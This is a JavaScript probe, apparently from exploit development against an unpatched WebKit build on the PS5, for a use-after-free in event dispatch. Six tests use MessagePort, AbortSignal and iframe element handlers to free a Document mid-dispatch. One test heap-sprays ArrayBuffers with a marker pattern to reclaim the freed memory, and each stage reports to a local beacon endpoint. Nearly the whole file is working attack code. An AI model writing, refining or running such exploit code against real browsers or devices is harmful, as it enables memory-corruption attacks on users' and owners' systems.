// p405 - EventTarget ScriptExecutionContext UAF probe (v3)
//
// Bug: EventTarget.cpp:332 captures raw reference to ScriptExecutionContext.
// If Document is destroyed during event dispatch, the reference at line 372
// (handleEvent call) is dangling. JSEventListener.cpp:131-153 dereferences it.
//
// Fixed in WK-1400: Ref<> strong reference at line 332.
// PS5 WK-1200: UNPATCHED (raw reference).
//
// Strategy: use non-Node EventTargets (MessagePort, AbortSignal) whose
// Document can be freed without DOM tree keeping it alive. Register two
// handlers: first removes iframe (frees Document), second triggers UAF.
//
// Beacon prefix: V405-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V405-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var testIdx = 0;
  var tests = [];

  function runNext() {
    if (testIdx < tests.length) {
      var t = tests[testIdx++];
      try {
        t();
      } catch(e) {
        B('T' + testIdx + '-THROW-' + e.message.substring(0, 50));
        setTimeout(runNext, 100);
      }
    } else {
      B('COMPLETE');
    }
  }

  // T1: MessagePort in iframe - primary UAF trigger
  // MessagePort is a non-Node EventTarget with ActiveDOMObject context.
  // When iframe is removed, Document may be freed while dispatch uses stale context.
  tests.push(function() {
    B('T1-START');
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var iwin = iframe.contentWindow;
        var idoc = iframe.contentDocument;
        if (!idoc || !idoc.body) {
          B('T1-NO-DOC');
          runNext();
          return;
        }

        // Create MessageChannel in iframe's context
        var MC = iwin.MessageChannel;
        if (!MC) {
          B('T1-NO-MC');
          runNext();
          return;
        }

        var channel = new MC();
        var port1 = channel.port1;
        var port2 = channel.port2;
        B('T1-PORTS-CREATED');

        // Register handlers on port1 (iframe's context)
        var h1Fired = false, h2Fired = false;

        port1.addEventListener('message', function(e) {
          h1Fired = true;
          B('T1-H1-DATA-' + e.data);
          // Drop all iframe references
          iwin = null;
          idoc = null;
          MC = null;
          channel = null;
          // Remove iframe - attempt to free its Document
          iframe.remove();
          iframe = null;
          B('T1-H1-REMOVED');
          // Allocate to trigger GC and reclaim Document memory
          for (var i = 0; i < 500; i++) {
            var g = { x: new Array(256), y: i };
          }
        });

        port1.addEventListener('message', function(e) {
          h2Fired = true;
          // If Document was freed, this handler runs with stale context at line 372
          // JSEventListener.cpp:131 dereferences it: isJSExecutionForbidden()
          B('T1-H2-ENTER');
          try {
            B('T1-H2-SURVIVED');
          } catch(err) {
            B('T1-H2-ERR-' + err.message.substring(0, 50));
          }
        });

        port1.start();
        // Send message to trigger dispatch
        port2.postMessage('trigger');
        port2.close();

        setTimeout(function() {
          B('T1-RESULT-H1-' + h1Fired + '-H2-' + h2Fired);
          runNext();
        }, 500);
      } catch(e) {
        B('T1-ERR-' + e.message.substring(0, 60));
        runNext();
      }
    }, 200);
  });

  // T2: AbortSignal in iframe (if AbortController available)
  // AbortSignal is a non-Node EventTarget with ContextDestructionObserver.
  // abort() dispatches synchronously - both handlers run before returning.
  tests.push(function() {
    B('T2-START');
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var iwin = iframe.contentWindow;
        if (!iwin) {
          B('T2-NO-WIN');
          runNext();
          return;
        }

        var AC = iwin.AbortController;
        if (!AC) {
          B('T2-NO-AC');
          setTimeout(runNext, 100);
          return;
        }

        var ac = new AC();
        var signal = ac.signal;
        B('T2-AC-CREATED');

        signal.addEventListener('abort', function() {
          B('T2-H1-ABORT');
          iwin = null;
          AC = null;
          iframe.remove();
          iframe = null;
          B('T2-H1-REMOVED');
          // GC pressure
          for (var i = 0; i < 500; i++) {
            var g = { x: new Array(256) };
          }
        });

        signal.addEventListener('abort', function() {
          B('T2-H2-ENTER');
          // abort() is synchronous - if Document freed, this is UAF
          try {
            B('T2-H2-SURVIVED');
          } catch(e) {
            B('T2-H2-ERR-' + e.message.substring(0, 50));
          }
        });

        // Drop refs before triggering
        iwin = null;
        AC = null;
        ac.abort();
        ac = null;
        signal = null;

        B('T2-DONE');
        setTimeout(runNext, 200);
      } catch(e) {
        B('T2-ERR-' + e.message.substring(0, 60));
        setTimeout(runNext, 100);
      }
    }, 200);
  });

  // T3: Element in iframe with document.open() in handler
  // document.open() replaces document content. Even though it reuses the Document
  // object, the ScriptExecutionContext state changes mid-dispatch.
  tests.push(function() {
    B('T3-START');
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var idoc = iframe.contentDocument;
        if (!idoc || !idoc.body) {
          B('T3-NO-DOC');
          runNext();
          return;
        }

        var el = idoc.createElement('div');
        idoc.body.appendChild(el);

        el.addEventListener('click', function() {
          B('T3-H1');
          // Destroy iframe Document via removal + navigation
          iframe.remove();
          B('T3-H1-REMOVED');
        });

        el.addEventListener('click', function() {
          B('T3-H2-ENTER');
          // el.ownerDocument should still be the old (possibly freed) Document
          try {
            var d = el.ownerDocument;
            B('T3-H2-OWNERDOC-' + (d ? 'ALIVE' : 'NULL'));
            if (d) {
              B('T3-H2-URL-' + (d.URL || 'none').substring(0, 30));
              B('T3-H2-CHILDREN-' + (d.body ? d.body.childNodes.length : 'nobody'));
            }
          } catch(e) {
            B('T3-H2-ERR-' + e.message.substring(0, 50));
          }
        });

        el.dispatchEvent(new Event('click'));
        B('T3-DISPATCHED');
        setTimeout(runNext, 200);
      } catch(e) {
        B('T3-ERR-' + e.message.substring(0, 60));
        setTimeout(runNext, 100);
      }
    }, 200);
  });

  // T4: MessagePort with heap spray between handlers
  // After first handler frees Document, spray controlled data to reclaim memory.
  // If UAF fires, handleEvent reads from our sprayed data.
  tests.push(function() {
    B('T4-START');
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var iwin = iframe.contentWindow;
        var idoc = iframe.contentDocument;
        if (!idoc || !idoc.body) {
          B('T4-NO-DOC');
          runNext();
          return;
        }

        var MC = iwin.MessageChannel;
        if (!MC) {
          B('T4-NO-MC');
          runNext();
          return;
        }

        var ch = new MC();
        var p1 = ch.port1;
        var p2 = ch.port2;

        var sprayBuffers = [];

        p1.addEventListener('message', function(e) {
          B('T4-H1');
          iwin = null;
          idoc = null;
          MC = null;
          ch = null;
          iframe.remove();
          iframe = null;
          B('T4-H1-FREED');

          // Heavy spray to reclaim Document memory
          // Document is ~2048-4096 bytes. Spray multiple sizes.
          for (var sz = 512; sz <= 8192; sz *= 2) {
            for (var i = 0; i < 200; i++) {
              var ab = new ArrayBuffer(sz);
              var view = new Uint32Array(ab);
              // Fill with marker pattern
              for (var j = 0; j < view.length; j++) {
                view[j] = 0x42424242;
              }
              sprayBuffers.push(ab);
            }
          }
          B('T4-H1-SPRAYED-' + sprayBuffers.length);
        });

        p1.addEventListener('message', function(e) {
          B('T4-H2-ENTER');
          // If Document was reclaimed by spray, handleEvent just ran on
          // sprayed data. The fact we reached here means either:
          // a) No UAF (Document alive)
          // b) UAF fired but didn't crash (sprayed data was "valid enough")
          // c) About to crash on next dereference
          try {
            B('T4-H2-SURVIVED-SPRAY-' + sprayBuffers.length);
          } catch(e) {
            B('T4-H2-ERR');
          }
        });

        p1.start();
        p2.postMessage('go');
        p2.close();

        setTimeout(function() {
          sprayBuffers = null;
          B('T4-DONE');
          runNext();
        }, 500);
      } catch(e) {
        B('T4-ERR-' + e.message.substring(0, 60));
        runNext();
      }
    }, 200);
  });

  // T5: WeakRef + FinalizationRegistry to detect Document collection
  // Register FinalizationRegistry on iframe's Document. If callback fires
  // during dispatch, Document was actually freed.
  tests.push(function() {
    B('T5-START');
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var idoc = iframe.contentDocument;
        if (!idoc || !idoc.body) {
          B('T5-NO-DOC');
          runNext();
          return;
        }

        var docCollected = false;
        var fr = new FinalizationRegistry(function(held) {
          docCollected = true;
          B('T5-DOC-COLLECTED-' + held);
        });

        // Try to register the Document with FinalizationRegistry
        try {
          fr.register(idoc, 'iframe-doc');
          B('T5-FR-REGISTERED');
        } catch(e) {
          B('T5-FR-ERR-' + e.message.substring(0, 40));
        }

        var wr = new WeakRef(idoc);
        B('T5-WEAKREF-' + (wr.deref() ? 'ALIVE' : 'DEAD'));

        var el = idoc.createElement('div');
        idoc.body.appendChild(el);

        el.addEventListener('click', function() {
          B('T5-H1');
          idoc = null;
          iframe.remove();
          iframe = null;
          // Heavy GC pressure
          for (var i = 0; i < 2000; i++) {
            var g = { a: new Array(100) };
          }
          B('T5-H1-GC-DONE');
          B('T5-WEAKREF-AFTER-' + (wr.deref() ? 'ALIVE' : 'DEAD'));
        });

        el.addEventListener('click', function() {
          B('T5-H2-ENTER');
          B('T5-H2-DOC-COLLECTED-' + docCollected);
          B('T5-H2-WEAKREF-' + (wr.deref() ? 'ALIVE' : 'DEAD'));
        });

        el.dispatchEvent(new Event('click'));
        B('T5-DISPATCHED');

        // Check again after a delay (GC might be deferred)
        setTimeout(function() {
          B('T5-DELAYED-WEAKREF-' + (wr.deref() ? 'ALIVE' : 'DEAD'));
          B('T5-DELAYED-COLLECTED-' + docCollected);
          runNext();
        }, 1000);
      } catch(e) {
        B('T5-ERR-' + e.message.substring(0, 60));
        runNext();
      }
    }, 200);
  });

  // T6: AbortSignal abort during nested dispatch
  // Create AbortSignal in main document, then trigger abort inside
  // a MutationObserver callback (microtask) during another event dispatch.
  // The nested dispatch creates a second innerInvokeEventListeners frame
  // while the first is still on the stack.
  tests.push(function() {
    B('T6-START');

    if (typeof AbortController === 'undefined') {
      B('T6-NO-AC');
      setTimeout(runNext, 100);
      return;
    }

    var ac = new AbortController();
    var signal = ac.signal;
    var div = document.createElement('div');
    document.body.appendChild(div);

    var nestedAbortFired = false;

    // Register handler on signal that will fire during nested dispatch
    signal.addEventListener('abort', function() {
      B('T6-ABORT-H1');
      // During this handler, try to mess with the execution context
      document.open();
      document.write('<html><body><div id="replaced">yes</div></body></html>');
      document.close();
      B('T6-ABORT-DOCOPEN-DONE');
    });

    signal.addEventListener('abort', function() {
      B('T6-ABORT-H2');
      // After document.open, the Document's state has changed
      // The context at line 332 was captured before document.open
      try {
        var r = document.getElementById('replaced');
        B('T6-ABORT-H2-REPLACED-' + (r ? r.textContent : 'null'));
      } catch(e) {
        B('T6-ABORT-H2-ERR-' + e.message.substring(0, 50));
      }
    });

    ac.abort();
    B('T6-DONE');
    setTimeout(runNext, 500);
  });

  runNext();
})();
